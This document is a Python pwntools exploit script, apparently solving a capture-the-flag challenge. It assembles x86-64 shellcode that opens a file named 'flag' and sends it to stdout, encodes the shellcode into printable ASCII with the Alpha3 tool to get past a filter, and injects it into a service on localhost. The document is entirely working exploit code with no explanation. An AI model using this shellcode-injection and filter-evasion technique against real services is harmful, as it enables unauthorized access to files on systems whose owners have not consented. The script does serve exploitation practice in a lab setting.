
"""alpha — uses Alpha3 to generate printable shellcode"""
from pwn import *
import subprocess, os
context.arch='amd64'; context.log_level='info'
HOST,PORT="127.0.0.1",55471

sc=asm('''
    push 0x67616c66; push rsp; pop rsi; push -100; pop rdi
    xor edx, edx; xor r10d, r10d
    xor eax, eax; mov al, 1; mov ah, 1
    syscall
    push 1; pop rdi; push rax; pop rsi; xor edx, edx
    xor r10d, r10d; mov r10b, 1; shl r10, 8
    push 40; pop rax; syscall
''')
assert b'\x00' not in sc, "NULL bytes in shellcode!"
with open('sc.bin','wb') as f: f.write(sc)

result = subprocess.run(
    ['python3', r'D:\alpha3\ALPHA3.py', 'x64', 'ascii', 'mixedcase', 'RBX', '--input=sc.bin'],
    capture_output=True, timeout=60, cwd=r'D:\alpha3'
)
if result.returncode != 0:
    log.error(f"Alpha3 failed: {result.stderr.decode()}")
    exit(1)

stage1 = result.stdout.strip()
stage1 = bytes(b for b in stage1 if 0x21 <= b <= 0x7e)
log.success(f"Shellcode: {len(stage1)} bytes, printable: {all(0x21<=b<=0x7e for b in stage1)}")

r=remote(HOST,PORT)
r.recvuntil(b'only:'); r.recvline()
r.send(stage1 + b'\n')
sleep(0.5)
try:
    d=r.recvall(timeout=5); print(d.decode(errors='replace'))
except:
    r.interactive()
